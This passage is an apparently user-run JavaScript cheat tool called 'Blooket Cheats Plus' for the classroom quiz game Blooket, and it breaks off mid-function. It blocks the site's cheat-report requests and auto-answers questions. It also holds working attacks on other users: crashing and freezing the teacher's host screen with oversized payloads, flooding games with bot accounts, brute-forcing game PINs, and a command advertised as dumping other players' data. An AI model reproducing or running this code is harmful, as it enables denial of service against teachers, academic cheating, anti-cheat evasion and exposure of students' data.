(async () => {
    if (String(window.fetch.call).includes("native")) {
        var e = window.fetch.call;
        window.fetch.call = function() {
            if (!arguments[1].includes("s.blooket.com/rc")) return e.apply(this, arguments);
            console.log("You tried to get caught cheating!")
        }
    } else console.log("already run");
    if (console.log("%c Blooket Cheats Plus %c\n	By DannyDan0167 on GitHub", "color: #0bc2cf; font-size: 3rem", "color: #8000ff; font-size: 1rem"), console.log("%c	Mobilegui.js", "color: #0bc2cf; font-size: 1rem"), console.log("%c	Star the github repo!%c  https://github.com/DannyDan0167/Blooket-Cheats-Plus", "color: #ffd000; font-size: 1rem", ""), document.querySelector("script[src*='bfs/index.js']") && !window.clearId) {
        for (var t = document.createElement("iframe"), o = (document.body.appendChild(t), window.clearId = window.setInterval(() => {}, 0)); o--;) t.contentWindow.clearInterval.call(window, o);
        t.remove()
    } {
        var t, o = document.createElement("iframe"),
            o = (document.body.append(o), window.alert = o.contentWindow.alert.bind(window), window.prompt = o.contentWindow.prompt.bind(window), window.confirm = o.contentWindow.confirm.bind(window), o.remove(), (e, t = {}) => Object.entries(t).forEach(([t, o]) => e.style[t] = o));
        (t = document.createElement("style")).innerHTML = "details > summary { cursor: pointer; transition: 0.15s; list-style: none; } details > summary:hover { color: hsl(0, 0%, 50%) } details > summary::-webkit-details-marker { display: none; } details summary ~ * { animation: sweep .5s ease-in-out; } @keyframes sweep { 0%    {opacity: 0; transform: translateY(-10px)} 100%  {opacity: 1; transform: translateY(0)} } .cheat { border: none; background: hsl(0, 0%, 20%); padding: 5px; margin: 3px; width: 60%; color: hsl(0, 0%, 100%); transition: 0.2s; border-radius: 5px; cursor: pointer; } .cheat:hover { background: hsl(0, 0%, 30%); }";
        let a = document.createElement("div");
        [...document.querySelectorAll("#JODMOBILE")].forEach(e => e.remove()), a.id = "JODMOBILE", a.appendChild(t), o(a, {
            width: "400px",
            background: "hsl(0, 0%, 10%)",
            backgroundImage: "linear-gradient(rgba(0, 0, 0, 0.95), rgba(0, 0, 0, 0.95)), url(https://ac.blooket.com/dashboard/65a43218fd1cabe52bdf1cda34613e9e.png)",
            borderRadius: "10px",
            position: "absolute",
            textAlign: "center",
            fontFamily: "Nunito",
            color: "white",
            overflow: "hidden",
            top: "50px",
            left: "50px"
        });
        var r, n, i = 0,
            s = 0,
            t = (a.onpointerdown = (e = window.event) => {
                e.preventDefault(), i = e.clientX, s = e.clientY, document.onpointerup = () => {
                    document.onpointerup = null, document.onpointermove = null
                }, document.onpointermove = e => {
                    (e = e || window.event).preventDefault(), r = i - e.clientX, n = s - e.clientY, i = e.clientX, s = e.clientY, a.style.top = a.offsetTop - n + "px", a.style.left = a.offsetLeft - r + "px"
                }
            }, document.createElement("div")),
            l = (a.appendChild(t), o(t, {
                width: "100%",
                height: "35px",
                paddingTop: "2px",
                fontSize: "1.5rem",
                textAlign: "center"
            }), t.innerHTML = 'Blooket Cheats Plus <span style="font-size: 0.75rem">v15.30.00</span>', document.createElement("button")),
            l = (t.appendChild(l), o(l, {
                background: "red",
                height: "45px",
                width: "45px",
                border: "none",
                cursor: "pointer",
                position: "absolute",
                top: "-10px",
                right: "-10px",
                fontSize: "1.5rem",
                borderRadius: "10px",
                fontFamily: "Nunito",
                fontWeight: "bolder",
                paddingTop: "10px",
                paddingRight: "15px"
            }), l.innerText = "X", l.onclick = () => {
                $(), a.remove(), removeEventListener("keypress", f)
            }, document.createElement("button"));
        t.appendChild(l), o(l, {
            background: "#444444",
            height: "45px",
            width: "45px",
            border: "none",
            cursor: "pointer",
            position: "absolute",
            top: "-10px",
            left: "-10px",
            fontSize: "1.5rem",
            borderRadius: "10px",
            fontFamily: "Nunito",
            fontWeight: "bolder",
            paddingTop: "10px",
            paddingLeft: "15px"
        }), l.innerText = "-", l.onclick = () => c.hidden = !c.hidden;
        let c = document.createElement("div"),
            d = (t = document.createElement("div"), c.appendChild(t), a.appendChild(c), t.innerHTML = `<span id="curPageEl">${_(!0)?"Current gamemode: "+_(!0):"No game detected"}</span><br><span>(Press E to hide)</span><br>`, t.style.display = "block", t.style.margin = "10px", document.body.append(a), o = document.createElement("div"), c.appendChild(o), o.style.fontSize = "0.9rem", o.style.paddingBottom = "5px", {
                global: [{
                    name: "Auto Answer (Toggle)",
                    description: "Toggles auto answer on",
                    type: "toggle",
                    enabled: (o.innerHTML = '<span><a target="blank" href="https://discord.gg/8A6J234n7v">Discord</a><br/><a target="blank" href="https://github.com/DannyDan0167/Blooket-Cheats-Plus/">GitHub - DannyDan0167</a></span>', !1),
                    data: null,
                    run: function() {
                        this.enabled ? (this.enabled = !1, clearInterval(this.data), this.data = null) : (this.enabled = !0, this.data = setInterval(() => {
                            let {
                                state: {
                                    question: e,
                                    stage: t,
                                    feedback: o
                                },
                                props: {
                                    client: {
                                        question: a
                                    }
                                }
                            } = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                            try {
                                "typing" != e.qType ? ("feedback" === t || o ? document.querySelector('[class*="feedback"]')?.firstChild : [...document.querySelectorAll('[class*="answerContainer"]')][(e || a).answers.map((t, o) => (e || a).correctAnswers.includes(t) ? o : null).filter(e => null != e)[0]])?.click?.() : Object.values(document.querySelector("[class*='typingAnswerWrapper']"))[1].children._owner.stateNode.sendAnswer(e.answers[0])
                            } catch {}
                        }, 50))
                    }
                }, {
                    name: "Highlight Answers (Toggle)",
                    description: "Toggles highlight answers on",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        this.enabled ? (this.enabled = !1, clearInterval(this.data), this.data = null) : (this.enabled = !0, this.data = setInterval(() => {
                            let {
                                stateNode: {
                                    state: e,
                                    props: t
                                }
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner;
                            [...document.querySelectorAll('[class*="answerContainer"]')].forEach((o, a) => {
                                (e.question || t.client.question).correctAnswers.includes((e.question || t.client.question).answers[a]) ? o.style.backgroundColor = "rgb(0, 207, 119)" : o.style.backgroundColor = "rgb(189, 15, 38)"
                            })
                        }, 50))
                    }
                }, {
                    name: "Subtle Highlight Answers (Toggle)",
                    description: "Toggles subtle highlight answers on",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        this.enabled ? (this.enabled = !1, clearInterval(this.data), this.data = null) : (this.enabled = !0, this.data = setInterval(() => {
                            let {
                                stateNode: {
                                    state: e,
                                    props: t
                                }
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner;
                            [...document.querySelectorAll('[class*="answerContainer"]')].forEach((o, a) => {
                                (e.question || t.client.question).correctAnswers.includes((e.question || t.client.question).answers[a]) && (o.style.boxShadow = "unset")
                            })
                        }, 50))
                    }
                }, {
                    name: "Freeze Leaderboard",
                    description: "Freezes the leaderboard on the host's screen",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        if (this.enabled) this.enabled = !1, clearInterval(this.data), this.data = null;
                        else {
                            this.enabled = !0;
                            let e = () => {
                                var e = Object.values(function e(t = document.querySelector("#app")) {
                                    return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                                }())[1].children[0]._owner.stateNode;
                                e.props.liveGameController.setVal({
                                    path: `c/${e.props.client.name}/tat/Freeze`,
                                    val: "Frozen"
                                })
                            };
                            this.data = setInterval(e, 50)
                        }
                    }
                }, {
                    name: "Percent Auto Answer",
                    description: "Answers questions correctly or incorrectly depending on the goal grade given (Disable and re-enable to update goal)",
                    type: "toggle",
                    enabled: !1,
                    data: null,
                    run: function() {
                        if (this.enabled) this.enabled = !1, clearInterval(this.data), this.data = null;
                        else {
                            this.enabled = !0;
                            let e = parseFloat(prompt("What grade do you want to get from this set? (0-100)"));
                            for (;
                                "number" != typeof e || isNaN(e);) e = parseFloat(prompt("What grade do you want to get from this set? (0-100)\nInvalid Number"));
                            let {
                                stateNode: t
                            } = Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner;
                            this.data = setInterval(e => {
                                try {
                                    let o = t.state.question || t.props.client.question;
                                    if ("feedback" == t.state.stage || t.state.feedback) return document.querySelector('[class*="feedback"], [id*="feedback"]')?.firstChild?.click?.();
                                    if (document.querySelector("[class*='answerContainer']") || document.querySelector("[class*='typingAnswerWrapper']")) {
                                        let a = 0,
                                            r = 0;
                                        for (let n in t.corrects) a += t.corrects[n];
                                        for (let i in t.incorrects) r += t.incorrects[i];
                                        r += a;
                                        let s = 0 == r || Math.abs(a / (r + 1) - e) >= Math.abs((a + 1) / (r + 1) - e);
                                        if ("typing" != t.state.question.qType) {
                                            let l = document.querySelectorAll("[class*='answerContainer']");
                                            for (let c = 0; c < l.length; c++) {
                                                let d = o.correctAnswers.includes(o.answers[c]);
                                                if (s && d || !s && !d) return l[c]?.click?.()
                                            }
                                            l[0].click()
                                        } else Object.values(document.querySelector("[class*='typingAnswerWrapper']"))[1].children._owner.stateNode.sendAnswer(s ? o.answers[0] : Math.random().toString(36).substring(2))
                                    }
                                } catch {}
                            }, 100, (e ?? 100) / 100)
                        }
                    }
                }, {
                    name: "Auto Answer",
                    description: "Click the correct answer for you",
                    run: function() {
                        let {
                            state: {
                                question: e,
                                stage: t,
                                feedback: o
                            },
                            props: {
                                client: {
                                    question: a
                                }
                            }
                        } = Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode;
                        try {
                            "typing" != e.qType ? ("feedback" === t || o ? document.querySelector('[class*="feedback"]')?.firstChild : [...document.querySelectorAll('[class*="answerContainer"]')][(e || a).answers.map((t, o) => (e || a).correctAnswers.includes(t) ? o : null).filter(e => null != e)[0]])?.click?.() : Object.values(document.querySelector("[class*='typingAnswerWrapper']"))[1].children._owner.stateNode.sendAnswer(e.answers[0])
                        } catch {}
                    }
                }, {
                    name: "Highlight Answers",
                    description: "Colors answers to be red or green highlighting the correct ones",
                    run: function() {
                        let {
                            stateNode: {
                                state: e,
                                props: t
                            }
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner;
                        [...document.querySelectorAll('[class*="answerContainer"]')].forEach((o, a) => {
                            (e.question || t.client.question).correctAnswers.includes((e.question || t.client.question).answers[a]) ? o.style.backgroundColor = "rgb(0, 207, 119)" : o.style.backgroundColor = "rgb(189, 15, 38)"
                        })
                    }
                }, {
                    name: "Subtle Highlight Answers",
                    description: "Removes the shadow from correct answers",
                    run: function() {
                        let {
                            stateNode: {
                                state: e,
                                props: t
                            }
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner;
                        [...document.querySelectorAll('[class*="answerContainer"]')].forEach((o, a) => {
                            (e.question || t.client.question).correctAnswers.includes((e.question || t.client.question).answers[a]) && (o.style.boxShadow = "unset")
                        })
                    }
                }, {
                    name: "Spam Buy Blooks",
                    description: "Opens a box an amount of times",
                    run: async function() {
                        let e = document.createElement("iframe");
                        document.body.append(e), window.alert = e.contentWindow.alert.bind(window), window.prompt = e.contentWindow.prompt.bind(window), window.confirm = e.contentWindow.confirm.bind(window), e.remove();
                        let {
                            stateNode: t
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner, o = Array.from(document.querySelectorAll("[class*='packsWrapper'] > div")).reduce((e, t) => (t.querySelector("[class*='blookContainer'] > img") || (e[t.querySelector("[class*='packImgContainer'] > img").alt] = parseInt(t.querySelector("[class*='packBottom']").textContent)), e), {}), a = prompt('Which box do you want to open? (ex: "Ice Monster")').split(" ").map(e => e.charAt(0).toUpperCase() + e.slice(1).toLowerCase()).join(" "), r = o[a];
                        if (!r) return alert("I couldn't find that box!");
                        let n = Math.min(Math.floor(t.state.tokens / r), parseInt(`0${prompt("How many boxes do you want to open?")}`));
                        if (0 == n) return alert("You do not have enough tokens!");
                        let i = confirm("Would you like to show blooks as unlocking?"),
                            s = {},
                            l = Date.now();
                        for (let c = 0; c < n; c++) {
                            await t.buyPack(!0, a), s[t.state.unlockedBlook] ||= 0, s[t.state.unlockedBlook]++;
                            let d = Date.now();
                            l += Date.now() - d, t.setState({
                                canOpen: !0,
                                currentPack: "",
                                opening: i,
                                doneOpening: i,
                                openPack: i
                            }), clearTimeout(t.canOpenTimeout)
                        }
                        await new Promise(e => setTimeout(e)), alert(`(${Date.now()-l}ms) Results: ${Object.entries(s).map(([e,t])=>`    ${e} ${t}`).join(` `)}`)
                    }
                }, {
                    name: "Remove Name Limit",
                    description: "Sets the name limit to 120, which is the actual max name length limit",
                    run: function() {
                        var e = document.createElement("iframe");
                        document.body.append(e), window.alert = e.contentWindow.alert.bind(window), e.remove(), document.querySelector('input[class*="nameInput"]').maxLength = 120, alert("Removed name length limit")
                    }
                }, {
                    name: "Remove Random Name",
                    description: "Allows you to put a custom name",
                    run: function() {
                        Object.values(document.querySelector("body div[id] > div > div"))[1].children[0]._owner.stateNode.setState({
                            isRandom: !1,
                            client: {
                                name: ""
                            }
                        }), document.querySelector('[class*="nameInput"]')?.focus?.()
                    }
                }, {
                    name: "Sell Duplicate Blooks",
                    description: "Sell all duplicate blooks leaving you with 1 each",
                    run: async function() {
                        let e = document.createElement("iframe");
                        if (document.body.append(e), window.alert = e.contentWindow.alert.bind(window), window.confirm = e.contentWindow.confirm.bind(window), e.remove(), /dashboard.*\/blooks/.test(window.location.href)) {
                            if (confirm("Are you sure you want to sell your dupes? (Legendaries and rarer will not be sold)")) {
                                let {
                                    stateNode: t
                                } = Object.values(function e(t = document.querySelector("body>div")) {
                                    return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                                }())[1].children[0]._owner, o = Date.now(), a = "";
                                for (let r in t.state.blookData)
                                    if (t.state.blookData[r] > 1) {
                                        if (t.setState({
                                                blook: r,
                                                numToSell: t.state.blookData[r] - 1
                                            }), ["Legendary", "Chroma", "Mystical"].includes(document.querySelector("[class*='highlightedRarity']").innerText.trim())) continue;
                                        a += `    ${r} ${t.state.blookData[r]-1} `, await t.sellBlook({
                                            preventDefault() {}
                                        }, !0)
                                    } alert(`(${Date.now()-o}ms) Results: ${a.trim()}`)
                            }
                        } else alert("This can only be ran in the Blooks page.")
                    }
                }, {
                    name: "Remove all Taken Blooks",
                    description: "Removes all taken blooks, allowing you to use any taken blook. Only works in lobby.",
                    run: function() {
                        const stateNode = Object.values(document.querySelector("#app>div>div"))[1].children[0]._owner.stateNode;
                        stateNode.setState({
                            takenBlooks: {
                                includes: e => !1
                            }
                        });
                        stateNode.setState = function(a, b) {
                            if (a?.takenBlooks) {
                                return;
                            }
                            stateNode.updater.enqueueSetState(stateNode, a, b, "setState");
                        }
                    }
                }, {
                    name: "Simulate Unlock",
                    description: "Simulates unlocking a certain blook",
                    run: function() {
                        var unlockedBlook = window.prompt("Enter the blook (Case Sensitive):");

                        const stateNode = Object.values(document.querySelector("#app>div>div"))[1].children[0]._owner.stateNode;
                        stateNode.setState({
                            loadingPack: false,
                            openPack: true,
                            unlockedBlook,
                            newUnlock: true,
                            canOpen: false
                        });
                        setTimeout(() => stateNode.setState({
                            canOpen: true
                        }), 200);
                    }
                }, {
                    name: "Freeze Host",
                    description: "Freezes the host's screen",
                    run: function() {
                        const encodedChars = [
                            '\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'
                        ];

                        const chars = encodedChars.map(char => eval(`"${char}"`));

                        function makeLongText() {
                            return new Array(3e+6).fill().map(e => chars[Math.floor(Math.random() * chars.length)]).join("");
                        }

                        let {
                            props: t
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"));
                        }())[1].children[0]._owner.stateNode;

                        let repeatedText = makeLongText();
                        t.client.blook = repeatedText;
                        t.liveGameController.setVal({
                            path: `c/${t.client.name}/b`,
                            val: repeatedText
                        });
                    }
                }, {
                    name: "Blooket Bot",
                    description: "Opens Blooket Bot",
                    run: function() {
                        function getGameCode() {
                            const appDiv = document.querySelector('#app>div>div');
                            if (appDiv) {
                                const reactComponent = Object.values(appDiv)[1]?.children[0]?._owner;
                                return reactComponent?.stateNode?.props?.client?.hostId || null;
                            }
                            return null;
                        }

                        const gameCode = getGameCode();
                        const url = gameCode ? "https://blooketbot.glitch.me/?code=" + gameCode : "https://blooketbot.glitch.me/";
                        window.open(url, "_blank", "width=500,height=500,resizable=yes,scrollbars=yes,status=yes");
                    }
                }, {
                    name: "Lobbychat",
                    description: "Chat with other people and execute commands",
                    run: function() {
                        if (window.run) {
                            return;
                        } else {
                            window.run = true;
                        }

                        function e() {
                            return Object.values(document.querySelector("#app>div>div"))[1].children[0]._owner
                        }
                        var t = 0,
                            a = !1;
                        document.addEventListener("keydown", function(e) {
                            "`" === e.key && (a = !a, o.style.display = a ? "none" : "block")
                        });
                        let o = document.createElement("div");
                        o.className = "chat-box", document.body.appendChild(o);
                        let r = document.createElement("div");
                        r.className = "chat-header", r.textContent = "Chat", o.appendChild(r);
                        let i = document.createElement("div");
                        i.className = "chat-body", o.appendChild(i);
                        let n = document.createElement("input");

                        function s(e) {
                            let t = document.createElement("div");
                            t.textContent = e, i.appendChild(t)
                        }
                        n.type = "text", n.className = "chat-input", n.placeholder = "Type a message...", o.appendChild(n), o.style.position = "fixed", o.style.bottom = "20px", o.style.right = "20px", o.style.width = "300px", o.style.backgroundColor = "#fff", o.style.border = "1px solid #ccc", o.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)", r.addEventListener("click", () => {
                            i.classList.toggle("open")
                        }), n.addEventListener("keydown", function(a) {
                            13 === a.keyCode && (function a(o) {
                                var r, n, l, c, d, p, u, h = function e(t) {
                                    if ("/" !== t.charAt(0)) return !1;
                                    var a = t.split(" "),
                                        o = a[0].replace("/", "");
                                    return a.splice(0, 1), {
                                        cmd: o,
                                        args: a
                                    }
                                }(o);
                                if (h) switch (h.cmd) {
                                    case "cb":
                                        r = h.args.join(" "), (n = webpackJsonp.push([
                                            [], {
                                                1234(e, t, a) {
                                                    t.webpack = a
                                                }
                                            },
                                            [
                                                ["1234"]
                                            ]
                                        ]).webpack("MDrD").a)[r = Object.keys(n).find(e => r.toLocaleLowerCase() === e.toLocaleLowerCase())] ? (s("Setting blook to " + r + "!"), e().stateNode.props.liveGameController.setVal({
                                            id: e().stateNode.props.client.hostId,
                                            path: "c/" + e().stateNode.props.client.name,
                                            val: {
                                                b: r
                                            }
                                        }), e().stateNode.props.client.blook = r) : s("No blook with that name was found!");
                                        break;
                                    case "clear":
                                        i.innerHTML = "";
                                        break;
                                    case "dumpstate":
                                        Object.keys(e().stateNode.state).map(t => {
                                            var a = e().stateNode.state[t];
                                            if (null == a) return "N/A";
                                            Array.from(a) && "object" == typeof a && (a = "[Array]"), s(t + ":" + a)
                                        }).join(";");
                                        break;
                                    case "list":
                                        e().stateNode.props.liveGameController.getDatabaseVal("c").then(e => {
                                            s("Current Players(" + Object.keys(e).length + "): " + Object.keys(e).join(","))
                                        });
                                        break;
                                    case "tlog":
                                        window.logsv = !window.logsv, s("SetVal log set to " + (window.logsv ? "Enabled" : "Disabled"));
                                        break;
                                    case "setval":
                                        l = h.args, e().stateNode.props.liveGameController.setVal({
                                            path: "c/" + e().stateNode.props.client.name + "/" + l[0],
                                            val: l.slice(1, l.length).join(" ")
                                        });
                                        break;
                                    case "setstate":
                                        c = h.args, d = {}, c.forEach(e => {
                                            var t = e.split(":");
                                            Number.isNaN(parseInt(t[1])) || parseInt(t[1]).toString() !== t[1] || (t[1] = parseInt(t[1])), d[t[0]] = t[1]
                                        }), e().stateNode.setState(d), s("Set Successful!");
                                        break;
                                    case "ahelp":
                                        s("Advanced Commands: setval(sets val logged by tlog ex /setval b Chicken), tlog(toggles setval log), dumpstate(dumps react state),setstate(sets react state /setstate crypto:5 crypto2:5 etc)");
                                        break;
                                    case "help":
                                        s("Available Commands: help(gives help),ahelp(advanced commands help), cb(changes blook /cb cow), list(lists players connected), dump(dumps all available info about a player, passwords, etc(/dump player)), clear(clears chat), code(gives game code), unlock(unlocks blook on lobby screen)");
                                        break;
                                    case "dump":
                                        ! function t(a) {
                                            e().stateNode.props.liveGameController.getDatabaseVal("c/" + a).then(e => {
                                                null != e ? s("Dump: " + JSON.stringify(e)) : s("Player not found!")
                                            })
                                        }(h.args.join(" "));
                                        break;
                                    case "unlock":
                                        p = h.args.join(" "), (u = webpackJsonp.push([
                                            [], {
                                                1234(e, t, a) {
                                                    t.webpack = a
                                                }
                                            },
                                            [
                                                ["1234"]
                                            ]
                                        ]).webpack("MDrD").a)[p = Object.keys(u).find(e => p.toLocaleLowerCase() === e.toLocaleLowerCase())] ? (e().stateNode.state.unlocks.push(p), e().stateNode.forceUpdate()) : s("No blook with that name was found!");
                                        break;
                                    case "code":
                                        s("Game Code: " + e().stateNode.props.client.hostId);
                                        break;
                                    default:
                                        s("Unrecognized chat command!")
                                } else e().stateNode.props.liveGameController.setVal({
                                    id: e().stateNode.props.client.hostId,
                                    path: "c/" + e().stateNode.props.client.name + "/msg",
                                    val: {
                                        i: t,
                                        msg: o
                                    }
                                }), t++
                            }(a.srcElement.value), a.srcElement.value = "")
                        });
                        var l = e().stateNode.props.liveGameController._liveApp.database()._delegate._repoInternal.server_.onDataUpdate_;

                        function c(e) {
                            window.logsv && s("Path: " + e.path.split("/").splice(2, 2).join("/") + " Val: " + ("object" == typeof e.val ? JSON.stringify(e.val) : e.val))
                        }
                        e().stateNode.props.liveGameController._liveApp.database()._delegate._repoInternal.server_.onDataUpdate_ = function(e, t, a, o) {
                            var r, i;
                            console.log(e, t, a, o), r = e, null != (i = t) && r.includes("/msg") && i?.msg && (console.log(i.msg), s(r.split("/")[2] + ": " + i.msg)), l(e, t, a, o)
                        }, window.logsv = !1;
                        var d = e().stateNode.props.liveGameController.setVal;
                        e().stateNode.props.liveGameController.setVal = function() {
                            c.apply(this, arguments), d.apply(this, arguments)
                        }, e().stateNode.props.liveGameController._liveApp.database().ref(`${e().stateNode.props.liveGameController._liveGameCode}`).on("value", e => {}), s("Lobbychat successfully loaded!"), o.style.wordWrap = "break-word"
                    }
                }, {
                    name: "Pin Guesser",
                    description: "Brute forces combinations for existing pins",
                    run: function() {
                        var e = 0,
                            t = 0,
                            o = document.querySelector("div[class*='titleText']");

                        function a() {
                            return Object.values(function e(t = document.querySelector("body>div")) {
                                return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                            }())[1].children[0]._owner.stateNode
                        }(function r() {
                            let n = Math.floor(9e6 * Math.random()) + 1e6;
                            fetch(`https://fb.blooket.com/c/firebase/id?id=${n}`, {
                                method: "GET",
                                credentials: "include"
                            }).then(e => e.json()).then(i => {
                                !0 === i.success ? (console.log("Game found:", n), o.innerHTML = "Game Found!", a().setState({
                                    client: {
                                        hostId: n.toString()
                                    }
                                })) : (console.log("No game found for:", n), a().setState({
                                    client: {
                                        hostId: n.toString()
                                    }
                                }), e++, o.innerHTML = "Guesses: " + e, ++t > 15 ? (setTimeout(r, 1e3), t = 0) : r())
                            }).catch(e => {
                                alert("Error:" + e)
                            })
                        })()
                    }
                }, {
                    name: "Crash Game",
                    description: "Crashes the host's game",
                    run: function() {
                        var e = Object.values(function e(t = document.querySelector("#app")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner.stateNode;
                        e.props.liveGameController.setVal({
                            path: `c/${e.props.client.name}/b/toString`,
                            val: "Crashed"
                        })
                    }
                }, {
                    name: "Every Answer Correct",
                    description: "Sets every answer to be correct",
                    run: function() {
                        let {
                            stateNode: e
                        } = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"))
                        }())[1].children[0]._owner;
                        e.freeQuestions = e.freeQuestions?.map?.(e => ({
                            ...e,
                            correctAnswers: e.answers
                        })), e.questions = e.questions?.map?.(e => ({
                            ...e,
                            correctAnswers: e.answers
                        })), e.props.client.questions = e.props.client.questions.map(e => ({
                            ...e,
                            correctAnswers: e.answers
                        }))
                    }
                }, {
                    name: "Flood Game",
                    description: "Floods a game with a number of fake accounts",
                    run: async function() {
                        let e = document.createElement("iframe");

                        function t() {
                            return Object.values(document.querySelector("#app>div>div"))[1].children[0]._owner.stateNode
                        }
                        document.body.append(e), window.prompt = e.contentWindow.prompt.bind(window), e.remove();
                        var o = {
                                randomNames: !1
                            },
                            a = t().props.liveGameController._liveApp.firebase;
                        async function r(e, t) {
                            let o = await fetch("https://fb.blooket.com/c/firebase/join", {
                                body: JSON.stringify({
                                    id: e,
                                    name: t
                                }),
                                credentials: "include",
                                method: "PUT"
                            }).then(e => e.json());
                            if (o.success) {
                                let r = a.initializeApp({
                                    apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
                                    authDomain: "blooket-2020.firebaseapp.com",
                                    projectId: "blooket-2020",
                                    storageBucket: "blooket-2020.appspot.com",
                                    messagingSenderId: "741533559105",
                                    appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
                                    measurementId: "G-S3H5NGN10Z",
                                    databaseURL: o.fbShardURL
                                });
                                await r.auth().signInWithCustomToken(o.fbToken);
                                let n = r.database();
                                await n.ref(`${e}/c/${t}`).set({
                                    b: "Rainbow Astronaut",
                                    bg: "fire"
                                }), console.log("Bot joined!")
                            } else alert("Connect error: " + o.msg)
                        }
                        async function n() {
                            if (!t().props.liveGameController._liveApp) {
                                alert("You must be in a game for the flooder to work!");
                                return
                            }
                            var e, a = t().props.liveGameController._liveGameCode,
                                n = parseInt(prompt("Enter number of bots to flood with:"));
                            if (!n) {
                                alert("You must use a valid number!");
                                return
                            }
                            if (!o.randomNames) var s = prompt("Enter name of bots:");
                            for (var l = 0; l < n; l++) await r(a, e = o.randomNames ? i(15) : s + Math.floor(4e3 * Math.random()))
                        }

                        function i(e) {
                            for (var t = "", o = 0; o < e; o++) t += String.fromCharCode(65 + Math.floor(25 * Math.random()));
                            return t
                        }
                        n()
                    }
                }, {
                    name: "Change Blook Ingame",
                    description: "Changes your blook",
                    run: function() {
                        let i = document.createElement('iframe');
                        document.body.append(i);
                        window.prompt = i.contentWindow.prompt.bind(window);
                        i.remove();
                        let {
                            props
                        } = Object.values((function react(r = document.querySelector("body>div")) {
                            return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div"))
                        })())[1].children[0]._owner.stateNode;
                        props.client.blook = prompt("Blook Name: (Case Sensitive)");;
                        props.liveGameController.setVal({
                            path: `c/${props.client.name}/b`,
                            val: props.client.blook
                        });
                    }
                }, {
                    name: "Change Name Ingame",
                    description: "Changes your name ingame",
                    run: function() {
                        var newname = window.prompt("Enter the new name:");

                        (async () => {
                            const reactHandler = () => Object.values(document.querySelector("#app>div>div"))[1].children[0]._owner.stateNode;
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            let alert = i.contentWindow.alert.bind(window);
                            i.remove();

                            async function genToken(name) {
                                const res = await fetch("https://fb.blooket.com/c/firebase/join", {
                                    body: JSON.stringify({
                                        id: reactHandler().props.client.hostId,
                                        name
                                    }),
                                    headers: {
                                        "Content-Type": "application/json"
                                    },
                                    method: "PUT",
                                    credentials: "include"
                                }).then(e => e.json());
                                if (!res.success) {
                                    alert("Error: " + res.msg);
                                    return;
                                }
                                return res.fbToken;
                            }

                            const oldname = reactHandler().props.client.name;
                            reactHandler().props.client.name = newname;
                            const olddata = await reactHandler().props.liveGameController.getDatabaseVal(`c/${oldname}`);
                            await reactHandler().props.liveGameController.removeVal(`c/${oldname}`);
                            const token = await genToken(newname);
                            if (!token) {
                                return;
                            }
                            await reactHandler().props.liveGameController._liveApp.auth().signInWithCustomToken(token);
                            reactHandler().props.liveGameController._liveApp.auth().onAuthStateChanged(e => {
                                if (e.uid.split(":")[1] === newname) {
                                    reactHandler().props.liveGameController.setVal({
                                        path: `c/${newname}`,
                                        val: olddata
                                    });
                                }
                            });
                            reactHandler().setState({});
                        })();
                    }
                }, {
                    name: "Set Blook Ad Text",
                    description: "Sets a load of text as your blook and floods the teacher's screen in the lobby",
                    run: function() {
                        var text = window.prompt("Enter the text:");

                        let t = Object.values(function e(t = document.querySelector("body>div")) {
                            return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"));
                        }())[1].children[0]._owner.stateNode;

                        if (!String.prototype.inc) {
                            String.prototype.inc = String.prototype.includes;
                        }

                        String.prototype.includes = function(a) {
                            if (a == "#" && this.length > 30) {
                                return true;
                            }
                            return String.prototype.inc.apply(this, arguments);
                        };

                        let repeatedText = Array(500).fill(text).join(' ');

                        if (!t.state.unlocks) {
                            t.client.blook = repeatedText;
                        }

                        t.props.liveGameController.setVal({
                            path: `c/${t.props.client.name}/b`,
                            val: repeatedText
                        });
                    }
                }, {
                    name: "Set Blook Ad Text Ingame",
                    description: "Sets a load of text as your blook",
                    run: function() {
                        var text = window.prompt("Enter the text:");

                        let {
                            props: t
